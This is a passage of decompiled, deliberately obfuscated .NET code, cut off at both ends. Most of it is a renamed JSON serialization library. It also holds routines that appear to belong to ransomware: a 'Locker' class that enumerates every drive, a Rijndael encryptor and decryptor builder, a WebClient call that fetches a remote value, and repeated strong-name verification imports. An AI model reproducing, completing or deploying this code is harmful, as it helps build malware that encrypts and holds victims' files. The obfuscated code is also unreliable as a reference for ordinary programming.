              goto label_22;
            }
          }
          else
          {
            if (list is \u000E.\u0006)
              return ((\u000E.\u0006) list).\u0001();
            goto label_22;
          }
        }
        else
        {
          if (!obj7.\u0004())
            throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(13545), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj3.\u0002));
          obj8 = \u0014.\u0006.\u0001(obj0, obj7.\u0003() ? (IList) \u0014.\u0006.\u0001(obj7, obj5) : (IList) obj5, obj1, obj7, obj4, obj6);
          goto label_26;
        }
      }
      if (obj7.\u0002())
      {
        Array array = \u009E\u0002.\u0083\u0006(obj7.\u0001(), \u001F.\u007E\u0013\u0003((object) list));
        \u001C\u0002.\u007E\u0089\u0005((object) list, array, 0);
        list = (IList) array;
      }
      else
        return (obj7.\u0003 ?? \u0014.\u0006.\u0001(obj7))(new object[1]
        {
          (object) list
        });
label_22:
      obj8 = (object) list;
label_26:
      return obj8;
    }

    static void \u0001([In] System.Type obj0)
    {
      if (\u0010.\u000E.\u0001 != null)
        return;
      \u0010.\u000E.\u0001 = \u0014.\u0006.\u0001(obj0, new string[2]
      {
        \u0014.\u0006.\u0082(13586),
        \u0014.\u0006.\u0082(13591)
      });
    }

    static object \u0001([In] JsonSerializerInternalReader obj0, [In] \u0012.\u0007 obj1, [In] System.Type obj2, [In] bool obj3)
    {
      if (obj1 == null)
        throw new ArgumentNullException(\u0014.\u0006.\u0082(3503));
      \u0016.\u0007 obj4 = \u0014.\u0006.\u0001(obj0, obj2);
      object obj5;
      try
      {
        \u0005.\u0005 obj6 = \u0014.\u0006.\u0001(obj0, obj4, (\u0005.\u0005) null, (\u0006.\u0002) null, (JsonProperty) null);
        object obj7;
        if (obj1.\u0001() == JsonToken.None && !\u0014.\u0006.\u0001(obj0, obj1, obj4, obj6 != null))
        {
          if (obj4 != null && !obj4.\u0001)
          {
            if (true)
              throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(13600), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj4.\u0002()));
          }
          else
          {
            obj5 = (object) null;
            goto label_18;
          }
        }
        else if (obj6 == null || !obj6.\u0002())
        {
          if (true)
          {
            obj7 = \u0014.\u0006.\u0001(obj0, obj1, obj2, obj4, (JsonProperty) null, (\u0006.\u0002) null, (JsonProperty) null, (object) null);
            goto label_11;
          }
          else
            goto label_11;
        }
        obj7 = \u0014.\u0006.\u0001(obj0, obj6, obj1, obj2, (object) null);
label_11:
        if (obj3 && obj1.\u0001() && obj1.\u0001() != JsonToken.Comment)
          throw new JsonSerializationException(\u0014.\u0006.\u0082(13673));
        if (true)
          obj5 = obj7;
      }
      catch (Exception ex)
      {
        if (\u0014.\u0006.\u0001(obj1.\u0001(), (object) null, (object) null, ex, obj1 as \u000F.\u0001, obj4, (\u0016.\u0008) obj0))
        {
          \u0014.\u0006.\u0001(obj1, obj0, 0, false);
          obj5 = (object) null;
        }
        else
        {
          \u0014.\u0006.\u0001((\u0016.\u0008) obj0);
          throw;
        }
      }
label_18:
      return obj5;
    }

    static \u0002.\u0004 \u0001([In] string obj0, [In] \u0012.\u0015 obj1)
    {
      \u0015.\u0013 obj;
      while (true)
      {
        if (true)
          goto label_4;
label_2:
        return (\u0002.\u0004) null;
label_4:
        switch (obj0)
        {
          case null:
            goto label_2;
          default:
            if (true)
            {
              \u0014.\u0006.\u0001(obj1.\u0001, obj0, ref obj);
              goto label_6;
            }
            else
              continue;
        }
      }
label_6:
      return (\u0002.\u0004) obj;
    }

    static double \u0001([In] string obj0)
    {
      string str = global::\u0005.\u0099(\u0014.\u0006.\u0082(9184), \u0014.\u0006.\u0082(13774), obj0);
      \u0012.\u0015 obj1 = \u0014.\u0006.\u0001(\u0016\u0003.\u007E\u009C\u0006((object) new WebClient(), str));
      \u0015.\u0013 obj2;
      do
      {
        obj2 = obj1[\u0014.\u0006.\u0082(9242)];
        if (obj2 == null)
          goto label_5;
      }
      while (false);
      if (!\u0007\u0002.\u008C\u0004(global::\u0001.\u007E\u0001((object) obj2), \u0014.\u0006.\u0082(9251)))
        goto label_5;
label_4:
      throw new Exception(global::\u0001.\u007E\u0001((object) obj1));
label_5:
      if (true)
        return obj1[\u0014.\u0006.\u0082(9260)].\u0001<double>((object) \u0014.\u0006.\u0082(13799));
      goto label_4;
    }

    static void \u0001([In] object obj0, [In] JsonWriter obj1, [In] JsonToken obj2)
    {
      switch (obj2)
      {
        case JsonToken.None:
          return;
        case JsonToken.StartObject:
          obj1.\u0002();
          return;
        case JsonToken.StartArray:
          if (true)
          {
            obj1.\u0003();
            return;
          }
          break;
        case JsonToken.StartConstructor:
          \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(4207));
          obj1.\u0001(global::\u0001.\u007E\u0001(obj0));
          return;
        case JsonToken.PropertyName:
          \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(4207));
          obj1.\u0002(global::\u0001.\u007E\u0001(obj0));
          return;
        case JsonToken.Comment:
          obj1.\u0005(obj0 != null ? global::\u0001.\u007E\u0001(obj0) : (string) null);
          return;
        case JsonToken.Raw:
          obj1.\u0006(obj0 != null ? global::\u0001.\u007E\u0001(obj0) : (string) null);
          return;
        case JsonToken.Integer:
          \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(4207));
          obj1.\u0001(\u0082\u0003.\u0014\u0007(obj0, (IFormatProvider) \u0098.\u0002\u0004()));
          return;
        case JsonToken.Float:
          \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(4207));
          switch (obj0)
          {
            case Decimal num1:
              obj1.\u0001(num1);
              return;
            case double num2:
              obj1.\u0001(num2);
              return;
            case float num3:
              obj1.\u0001(num3);
              return;
            default:
              obj1.\u0001(\u008B\u0002.\u0002\u0006(obj0, (IFormatProvider) \u0098.\u0002\u0004()));
              return;
          }
        case JsonToken.String:
          \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(4207));
          obj1.\u0004(global::\u0001.\u007E\u0001(obj0));
          return;
        case JsonToken.Boolean:
          \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(4207));
          if (true)
          {
            obj1.\u0001(\u0090\u0003.\u0081\u0007(obj0, (IFormatProvider) \u0098.\u0002\u0004()));
            return;
          }
          goto case JsonToken.Null;
        case JsonToken.Null:
          obj1.\u0008();
          return;
        case JsonToken.Undefined:
          obj1.\u000E();
          return;
        case JsonToken.EndObject:
          obj1.\u0011();
          return;
        case JsonToken.EndArray:
          obj1.\u000F();
          return;
        case JsonToken.EndConstructor:
          obj1.\u0010();
          return;
        case JsonToken.Date:
          \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(4207));
          break;
        case JsonToken.Bytes:
          \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(4207));
          if (obj0 is Guid guid)
          {
            obj1.\u0001(guid);
            return;
          }
          obj1.\u0001((byte[]) obj0);
          return;
        default:
          throw \u0014.\u0006.\u0001(\u0014.\u0006.\u0082(7020), (object) obj2, \u0014.\u0006.\u0082(13812));
      }
      if (obj0 is DateTimeOffset dateTimeOffset)
        obj1.\u0001(dateTimeOffset);
      else
        obj1.\u0001(\u0091\u0003.\u0082\u0007(obj0, (IFormatProvider) \u0098.\u0002\u0004()));
    }

    static unsafe int \u0001([In] char[] obj0, [In] int obj1, [In] DateTime obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(24);
      *(int*) voidPtr = 19;
      // ISSUE: cast to a reference type
      // ISSUE: cast to a reference type
      // ISSUE: cast to a reference type
      \u0014.\u0006.\u0001((int&) ((IntPtr) voidPtr + 4), (int&) ((IntPtr) voidPtr + 12), (int&) ((IntPtr) voidPtr + 8), obj2);
      \u0014.\u0006.\u0001(4, obj0, *(int*) ((IntPtr) voidPtr + 4), obj1);
      obj0[obj1 + 4] = '-';
      \u0014.\u0006.\u0001(2, obj0, *(int*) ((IntPtr) voidPtr + 8), obj1 + 5);
      obj0[obj1 + 7] = '-';
      \u0014.\u0006.\u0001(2, obj0, *(int*) ((IntPtr) voidPtr + 12), obj1 + 8);
      obj0[obj1 + 10] = 'T';
      \u0014.\u0006.\u0001(2, obj0, obj2.Hour, obj1 + 11);
      obj0[obj1 + 13] = ':';
      \u0014.\u0006.\u0001(2, obj0, obj2.Minute, obj1 + 14);
      obj0[obj1 + 16] = ':';
      int num = 2;
      if (num != 0)
      {
        \u0014.\u0006.\u0001(num, obj0, obj2.Second, obj1 + 17);
        *(int*) ((IntPtr) voidPtr + 16) = (int) (obj2.Ticks % 10000000L);
        if (*(int*) ((IntPtr) voidPtr + 16) != 0)
          *(int*) ((IntPtr) voidPtr + 20) = 7;
        else
          goto label_7;
      }
      else
        goto label_5;
label_4:
      num = *(int*) ((IntPtr) voidPtr + 16) % 10;
label_5:
      if (num == 0)
      {
        *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) - 1;
        *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) / 10;
        goto label_4;
      }
      else
      {
        obj0[obj1 + 19] = '.';
        \u0014.\u0006.\u0001(*(int*) ((IntPtr) voidPtr + 20), obj0, *(int*) ((IntPtr) voidPtr + 16), obj1 + 20);
        *(int*) voidPtr = *(int*) voidPtr + (*(int*) ((IntPtr) voidPtr + 20) + 1);
      }
label_7:
      return obj1 + *(int*) voidPtr;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] JsonToken obj0, [In] JsonContainerType obj1, [In] JsonWriter obj2)
    {
      \u0014.\u0006.\u0001(obj2);
      obj2.\u0002(obj0);
      JsonWriter jsonWriter = obj2;
      int num = (int) obj1;
      if (false)
        return;
      \u0014.\u0006.\u0001(jsonWriter, (JsonContainerType) num);
    }

    static IList<int> \u0001([In] int obj0, [In] IList obj1)
    {
      IList list;
      IList<int> intList;
      if (true)
      {
        if (true)
        {
          intList = (IList<int>) new List<int>();
          list = obj1;
        }
        else
          goto label_6;
      }
      else
        goto label_4;
label_2:
      int count;
      if (true)
      {
        intList.Add(list.Count);
        count = intList.Count;
      }
      else
        goto label_6;
label_3:
      int num = obj0;
      if (count == num)
        goto label_8;
label_4:
      count = list.Count;
      if (true)
      {
        if (count == 0)
          goto label_8;
      }
      else
        goto label_3;
label_6:
      object obj = list[0];
      if (obj is IList)
      {
        list = (IList) obj;
        if (false)
          goto label_2;
        else
          goto label_2;
      }
label_8:
      return intList;
    }

    static \u0006.\u0005 \u0001([In] string obj0) => new \u0006.\u0005((object) obj0, JTokenType.Comment);

    static \u0005.\u000E \u0001(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] \u0016.\u0008 obj3,
      [In] Exception obj4)
    {
      if (obj3.\u0001 == null)
        goto label_4;
label_1:
      if (obj3.\u0001.\u0001() != obj4)
        throw new InvalidOperationException(\u0014.\u0006.\u0082(13845));
      return obj3.\u0001;
label_4:
      obj3.\u0001 = new \u0005.\u000E(obj1, obj2, obj0, obj4);
      goto label_1;
    }

    static void \u0001([In] \u0012.\u0007 obj0)
    {
      \u0014.\u0006.\u0001(obj0);
      if (\u0007\u0002.\u008C\u0004(global::\u0001.\u007E\u0001(obj0.\u0001()), \u0014.\u0006.\u0082(9813)))
        goto label_5;
label_4:
      throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(3638), (IFormatProvider) \u0098.\u0002\u0004(), (object) JsonToken.StartObject));
label_5:
      \u0012.\u0007 obj = obj0;
      if (true)
        goto label_6;
label_2:
      if (obj0.\u0001() != null && \u0097.\u007E\u0001\u0004((object) global::\u0001.\u007E\u0001(obj0.\u0001()), \u0014.\u0006.\u0082(13926), StringComparison.Ordinal))
      {
        \u0014.\u0006.\u0001(obj0);
        if (\u0007\u0002.\u008C\u0004(global::\u0001.\u007E\u0001(obj0.\u0001()), \u0014.\u0006.\u0082(7155)))
          return;
        goto label_4;
      }
      else
        goto label_4;
label_6:
      \u0014.\u0006.\u0001(obj);
      goto label_2;
    }

    static short? \u0001([In] \u0015.\u0013 obj0)
    {
      short? nullable;
      if (obj0 == null)
        nullable = new short?();
      else
        goto label_13;
label_12:
      return nullable;
label_13:
      \u0006.\u0005 obj1 = \u0014.\u0006.\u0001(obj0);
      if (obj1 != null)
      {
        int num = 1;
        int int16;
        while (true)
        {
          JTokenType[] jtokenTypeArray = \u0015.\u0013.\u0002;
          \u0006.\u0005 obj2 = obj1;
          if (\u0014.\u0006.\u0001(num != 0, jtokenTypeArray, (\u0015.\u0013) obj2))
          {
            if (true)
            {
              if (obj1.\u0001 != null)
              {
                int16 = (int) Convert.ToInt16(obj1.\u0001, (IFormatProvider) CultureInfo.InvariantCulture);
                if (false)
                  num = int16;
                else
                  goto label_11;
              }
              else
                break;
            }
            else
              goto label_12;
          }
          else
            goto label_5;
        }
        if (true)
          return new short?();
        goto label_12;
label_11:
        return new short?((short) int16);
      }
label_5:
      throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(13947), (IFormatProvider) CultureInfo.InvariantCulture, (object) \u0014.\u0006.\u0001(obj0)));
    }

    static void \u0001([In] \u0012.\u0007 obj0, [In] string obj1) => obj0.\u0001 = obj1;

    static byte? \u0001([In] \u0015.\u0013 obj0)
    {
      byte? nullable;
      if (obj0 == null)
        nullable = new byte?();
      else
        goto label_13;
label_12:
      return nullable;
label_13:
      \u0006.\u0005 obj1 = \u0014.\u0006.\u0001(obj0);
      if (obj1 != null)
      {
        int num1 = 1;
        int num2;
        while (true)
        {
          JTokenType[] jtokenTypeArray = \u0015.\u0013.\u0002;
          \u0006.\u0005 obj2 = obj1;
          if (\u0014.\u0006.\u0001(num1 != 0, jtokenTypeArray, (\u0015.\u0013) obj2))
          {
            if (true)
            {
              if (obj1.\u0001 != null)
              {
                num2 = (int) Convert.ToByte(obj1.\u0001, (IFormatProvider) CultureInfo.InvariantCulture);
                if (false)
                  num1 = num2;
                else
                  goto label_11;
              }
              else
                break;
            }
            else
              goto label_12;
          }
          else
            goto label_5;
        }
        if (true)
          return new byte?();
        goto label_12;
label_11:
        return new byte?((byte) num2);
      }
label_5:
      throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(13988), (IFormatProvider) CultureInfo.InvariantCulture, (object) \u0014.\u0006.\u0001(obj0)));
    }

    static string \u0001([In] \u0015.\u0013 obj0)
    {
      if (obj0 == null)
        return (string) null;
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj == null || !\u0014.\u0006.\u0001(true, \u0015.\u0013.\u0003, (\u0015.\u0013) obj))
      {
        if (true)
          throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(14029), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(obj0)));
      }
      else
      {
        if (obj.\u0001 == null)
          return (string) null;
        if (obj.\u0001 is byte[])
          return \u0092\u0003.\u0083\u0007((byte[]) obj.\u0001);
      }
      return \u0095\u0002.\u0017\u0006(obj.\u0001, (IFormatProvider) \u0098.\u0002\u0004());
    }

    static string \u0001([In] JsonWriter obj0)
    {
      if (obj0.\u0001.\u0001 == JsonContainerType.None)
        return string.Empty;
      \u0011.\u0002? nullable = (obj0.\u0001 == JsonWriter.State.ArrayStart || obj0.\u0001 == JsonWriter.State.ConstructorStart ? 0 : (obj0.\u0001 != JsonWriter.State.ObjectStart ? 1 : 0)) != 0 ? new \u0011.\u0002?(obj0.\u0001) : new \u0011.\u0002?();
      return \u0011.\u0002.\u0001(obj0.\u0001, nullable);
    }

    static \u0012.\u000F \u0001() => (\u0012.\u000F) \u0007.\u0002.\u0001;

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] \u0015.\u0013 obj0, [In] \u0015.\u0013 obj1)
    {
      if (false)
        return;
      if (obj0.\u0001 == null)
        throw new InvalidOperationException(\u0014.\u0006.\u0082(14070));
      obj0.\u0001.\u0002(obj0, obj1);
    }

    static void \u0001(System.Type _param0, out System.Type _param1, out System.Type _param2)
    {
      if (false)
        goto label_13;
      else
        goto label_10;
label_2:
      System.Type type1;
      int num1;
      if (num1 != 0)
      {
        if (true)
          throw new Exception(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(14124), (IFormatProvider) \u0098.\u0002\u0004(), (object) _param0));
      }
      else
      {
        System.Type[] typeArray = \u008F\u0002.\u007E\u000E\u0006((object) type1);
        _param1 = typeArray[0];
        _param2 = typeArray[1];
        return;
      }
label_8:
      _param1 = (System.Type) null;
      _param2 = (System.Type) null;
      return;
label_10:
      System.Type type2 = _param0;
      string str = \u0014.\u0006.\u0082(14103);
      if (true)
        \u0014.\u0006.\u0001((object) type2, str);
      // ISSUE: type reference
      if (!\u0014.\u0006.\u0001(_param0, \u0004\u0002.\u0084\u0004(__typeref (IDictionary<,>)), out type1))
      {
        // ISSUE: type reference
        int num2 = \u0093\u0002.\u007E\u0012\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (IDictionary)), _param0) ? 1 : 0;
        if (false)
        {
          num1 = num2;
          goto label_2;
        }
        else
        {
          if (num2 == 0)
            throw new Exception(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(14124), (IFormatProvider) \u0098.\u0002\u0004(), (object) _param0));
          goto label_8;
        }
      }
label_13:
      num1 = \u0015.\u000E.\u0004(type1) ? 1 : 0;
      goto label_2;
    }

    static bool \u0001([In] JsonSerializerInternalReader obj0, [In] JsonProperty obj1, [In] object obj2)
    {
      if (true)
        goto label_12;
label_1:
      return false;
label_12:
      if (obj1.\u0001().GetValueOrDefault(obj0.\u0001.\u0001) != \u0011.\u0005.\u0002 || obj2 != null)
      {
        JsonSerializerInternalReader serializerInternalReader1 = obj0;
        \u0008.\u0004? nullable = obj1.\u0001();
        int valueOrDefault1 = (int) nullable.GetValueOrDefault(obj0.\u0001.\u0001);
        int num1;
        if (\u0014.\u0006.\u0001(serializerInternalReader1, (\u0008.\u0004) valueOrDefault1, \u0008.\u0004.\u0002))
        {
          JsonSerializerInternalReader serializerInternalReader2 = obj0;
          nullable = obj1.\u0001();
          int valueOrDefault2 = (int) nullable.GetValueOrDefault(obj0.\u0001.\u0001);
          int num2 = \u0014.\u0006.\u0001(serializerInternalReader2, (\u0008.\u0004) valueOrDefault2, \u0008.\u0004.\u0003) ? 1 : 0;
          if (true)
          {
            if (num2 != 0)
              goto label_7;
          }
          else
          {
            num1 = num2;
            goto label_8;
          }
        }
        else
          goto label_7;
label_5:
        if (\u0008.\u0008.\u0001(obj2, \u0014.\u0006.\u0001(obj1)))
          return false;
label_7:
        num1 = obj1.\u0003() ? 1 : 0;
label_8:
        if (num1 == 0)
          return false;
        if (true)
          return true;
        goto label_5;
      }
      else
        goto label_1;
    }

    static string \u0001([In] JsonWriter obj0) => obj0.\u0001.\u0001 == JsonContainerType.None || obj0.\u0001 == null ? string.Empty : \u0011.\u0002.\u0001(obj0.\u0001, new \u0011.\u0002?());

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static bool \u0001(
      \u0004.\u0001 _param0,
      string _param1,
      ref DateTime _param2,
      string _param3,
      [Out] CultureInfo _param4)
    {
      DateTime dateTime;
      int num;
      if (true)
        num = \u0093\u0003.\u0084\u0007(_param1, _param3, (IFormatProvider) _param4, DateTimeStyles.RoundtripKind, ref dateTime) ? 1 : 0;
      else
        goto label_5;
label_2:
      if (num != 0)
      {
        dateTime = \u0014.\u0006.\u0001(dateTime, _param0);
        _param2 = dateTime;
        return true;
      }
label_5:
      _param2 = new DateTime();
      num = 0;
      if (num == 0)
        return num != 0 ? num != 0 : num != 0;
      goto label_2;
    }

    static void \u0001()
    {
      HashSet<string> stringSet = new HashSet<string>(Locker.\u0001());
      string[] array;
      do
      {
        IEnumerator<string> enumerator = ((IEnumerable<DriveInfo>) \u0094\u0003.\u0086\u0007()).Select<DriveInfo, string>((Func<DriveInfo, string>) (obj0 => global::\u0001.\u007E\u0006((object) \u008F.\u007E\u0094\u0003((object) obj0)))).GetEnumerator();
        try
        {
          do
          {
            while (\u0015\u0002.\u007E\u009E\u0004((object) enumerator))
              \u0014.\u0006.\u0001(enumerator.Current, \u0014.\u0006.\u0082(2668), stringSet);
          }
          while (false);
        }
        finally
        {
          if (enumerator != null)
            global::\u0011.\u007E\u0007\u0002((object) enumerator);
        }
        if (!global::\u0007.\u009D(Locker.\u0001))
          array = Locker.\u0001.ToArray<string>();
        else
          goto label_5;
      }
      while (false);
      goto label_12;
label_5:
      return;
label_12:
      \u0095\u0003.\u0087\u0007(Locker.\u0001, array);
    }

    static \u0012.\u0015 \u0001([In] \u0012.\u0007 obj0, [In] \u000F.\u0007 obj1)
    {
      \u0014.\u0006.\u0001((object) obj0, \u0014.\u0006.\u0082(3503));
      if (obj0.\u0001() == JsonToken.None && !obj0.\u0001())
        throw \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(14165));
      \u0014.\u0006.\u0001(obj0);
      if (obj0.\u0001() != JsonToken.StartObject)
        throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(14218), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001()));
      \u0012.\u0015 obj = new \u0012.\u0015();
      \u0014.\u0006.\u0001((\u0015.\u0013) obj, obj0 as \u000F.\u0001, obj1);
      \u0014.\u0006.\u0001((\u0004.\u0011) obj, obj0, obj1);
      return obj;
    }

    static \u0016.\u0007 \u0001([In] object obj0, [In] \u0010.\u0006 obj1)
    {
      while (obj0 != null)
      {
        if (true)
          return ((\u0016.\u0008) obj1).\u0001.\u0001.\u0001(\u0001\u0002.\u007E\u0017\u0004(obj0));
      }
      return (\u0016.\u0007) null;
    }

    static Stream \u0001([In] Dictionary<string, string> obj0, [In] string obj1)
    {
      string str;
      return !obj0.TryGetValue(obj1, out str) ? (Stream) null : \u0014.\u0006.\u0001(str);
    }

    static DateTime \u0001([In] DateTime obj0, [In] \u0004.\u0001 obj1)
    {
      if (true)
        goto label_8;
label_6:
      do
        ;
      while (false);
      return obj0;
label_8:
      switch (obj1)
      {
        case \u0004.\u0001.\u0001:
          if (true)
          {
            DateTime dateTime = \u0014.\u0006.\u0001(obj0);
            if (true)
              goto label_10;
label_2:
            if (false)
              break;
            goto label_6;
label_10:
            obj0 = dateTime;
            goto label_2;
          }
          else
            goto label_6;
        case \u0004.\u0001.\u0002:
          obj0 = \u0014.\u0006.\u0001(obj0);
          goto label_6;
        case \u0004.\u0001.\u0003:
          if (true)
          {
            obj0 = new DateTime(obj0.Ticks, DateTimeKind.Unspecified);
            goto label_6;
          }
          else
            goto label_6;
        case \u0004.\u0001.\u0004:
          goto label_6;
      }
      throw new ArgumentException(\u0014.\u0006.\u0082(14331));
    }

    static void \u0001(
      [In] XmlNamespaceManager obj0,
      [In] \u0011.\u000E obj1,
      [In] XmlNodeConverter obj2,
      [In] \u0012.\u0007 obj3,
      [In] IXmlNode obj4)
    {
      do
      {
        // ISSUE: object of a compiler-generated type is created
        // ISSUE: variable of a compiler-generated type
        XmlNodeConverter.\u0003 obj = new XmlNodeConverter.\u0003();
        switch (obj3.\u0001())
        {
          case JsonToken.StartConstructor:
            string str = global::\u0001.\u007E\u0001(obj3.\u0001());
            while (obj3.\u0001() && obj3.\u0001() != JsonToken.EndConstructor)
              \u0014.\u0006.\u0001(obj2, obj3, obj1, obj0, str, obj4);
            goto label_19;
          case JsonToken.PropertyName:
            if (obj4.\u0001() == XmlNodeType.Document && obj1.\u0001() != null)
              throw \u0014.\u0006.\u0001(obj3, \u0014.\u0006.\u0082(14376));
            // ISSUE: reference to a compiler-generated field
            obj.\u0001 = global::\u0001.\u007E\u0001(obj3.\u0001());
            obj3.\u0001();
            break;
          case JsonToken.Comment:
            obj4.\u0001(obj1.\u0001((string) obj3.\u0001()));
            goto label_19;
          case JsonToken.EndObject:
            return;
          case JsonToken.EndArray:
            return;
          default:
            if (true)
              throw \u0014.\u0006.\u0001(obj3, \u0086.\u0086\u0003((object) \u0014.\u0006.\u0082(14614), (object) obj3.\u0001()));
            break;
        }
        if (obj3.\u0001() == JsonToken.StartArray)
        {
          int num = 0;
          while (obj3.\u0001() && obj3.\u0001() != JsonToken.EndArray)
          {
            // ISSUE: reference to a compiler-generated field
            \u0014.\u0006.\u0001(obj2, obj3, obj1, obj0, obj.\u0001, obj4);
            ++num;
          }
          if (num == 1 && obj2.\u0003())
          {
            // ISSUE: reference to a compiler-generated method
            \u0014.\u0006.\u0001(obj4.\u0001().OfType<\u0002.\u0006>().Single<\u0002.\u0006>(new Func<\u0002.\u0006, bool>(obj.\u0001)), obj1, obj2);
          }
        }
        else
        {
          // ISSUE: reference to a compiler-generated field
          \u0014.\u0006.\u0001(obj2, obj3, obj1, obj0, obj.\u0001, obj4);
        }
label_19:;
      }
      while (obj3.\u0001() == JsonToken.PropertyName || obj3.\u0001());
    }

    static System.Type \u0001([In] System.Type obj0)
    {
      int num1 = 1;
      int index;
      System.Attribute[] attributeArray;
      if (num1 != 0)
      {
        attributeArray = \u0014.\u0006.\u0001(num1 != 0, (System.Type) null, (object) obj0);
        index = 0;
      }
      else
        goto label_9;
label_8:
      num1 = index;
label_9:
      int num2 = attributeArray.Length;
      if (true)
        goto label_10;
label_7:
      index = num1 + num2;
      goto label_8;
label_10:
      if (num1 >= num2)
        return (System.Type) null;
      if (true)
        goto label_12;
label_5:
      System.Attribute attribute;
      return (System.Type) \u0014.\u0006.\u0001(JsonTypeReflector.\u0001, (object) attribute, \u0014.\u0006.\u0082(14760));
label_12:
      attribute = attributeArray[index];
      System.Type type = \u0001\u0002.\u007E\u0017\u0004((object) attribute);
      if (\u008E\u0002.\u0007\u0006(global::\u0001.\u007E\u0008((object) type), \u0014.\u0006.\u0082(14679), StringComparison.Ordinal))
      {
        if (JsonTypeReflector.\u0001 == null)
        {
          JsonTypeReflector.\u0001 = \u0014.\u0006.\u0001(type, new string[1]
          {
            \u0014.\u0006.\u0082(14760)
          });
          goto label_5;
        }
        else
          goto label_5;
      }
      else
      {
        int num3 = index;
        num2 = 1;
        num1 = num3;
        goto label_7;
      }
    }

    static IList<\u0004.\u000E> \u0001([In] \u0016.\u0007 obj0)
    {
      if (obj0.\u0001 == null)
        obj0.\u0001 = (IList<\u0004.\u000E>) new List<\u0004.\u000E>();
      return obj0.\u0001;
    }

    static \u0012.\u0015 \u0001([In] string obj0, [In] \u000F.\u0007 obj1)
    {
      \u0012.\u0007 obj2 = (\u0012.\u0007) new \u0011.\u0003((TextReader) new StringReader(obj0));
      try
      {
        \u0012.\u0015 obj3 = \u0014.\u0006.\u0001(obj2, obj1);
        if (obj2.\u0001() && obj2.\u0001() != JsonToken.Comment)
          throw \u0014.\u0006.\u0001(obj2, \u0014.\u0006.\u0082(14785));
        return obj3;
      }
      finally
      {
        if (obj2 != null)
          global::\u0011.\u007E\u0007\u0002((object) obj2);
      }
    }

    static ICryptoTransform \u0001([In] bool obj0, [In] byte[] obj1, [In] byte[] obj2)
    {
      ICryptoTransform cryptoTransform1;
      using (SymmetricAlgorithm symmetricAlgorithm = (SymmetricAlgorithm) new RijndaelManaged())
      {
        ICryptoTransform cryptoTransform2;
        while (!obj0)
        {
          if (true)
          {
            cryptoTransform2 = symmetricAlgorithm.CreateEncryptor(obj1, obj2);
            goto label_3;
          }
        }
        goto label_5;
label_3:
        cryptoTransform1 = cryptoTransform2;
        if (true)
          goto label_9;
label_5:
        cryptoTransform2 = symmetricAlgorithm.CreateDecryptor(obj1, obj2);
        goto label_3;
      }
label_9:
      return cryptoTransform1;
    }

    static int \u0001([In] int obj0, [In] \u0016.\u0011 obj1) => obj0 + 1;

    static unsafe string \u0001([In] int obj0, [In] \u0008.\u0005 obj1, [In] char[] obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      IntPtr num = __untypedstackalloc(12);
      void* voidPtr;
      if (true)
        voidPtr = (void*) num;
      if (obj0 != 0)
        goto label_13;
label_1:
      return string.Empty;
label_13:
      *(int*) voidPtr = obj0 + \u0008.\u0005.\u0001;
      *(int*) voidPtr = *(int*) voidPtr + (*(int*) voidPtr << 7 ^ (int) obj2[obj3]);
      *(int*) ((IntPtr) voidPtr + 4) = obj3 + obj0;
      *(int*) ((IntPtr) voidPtr + 8) = obj3 + 1;
      while (*(int*) ((IntPtr) voidPtr + 8) < *(int*) ((IntPtr) voidPtr + 4))
      {
        *(int*) voidPtr = *(int*) voidPtr + (*(int*) voidPtr << 7 ^ (int) obj2[*(int*) ((IntPtr) voidPtr + 8)]);
        if (true)
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
        else
          goto label_1;
      }
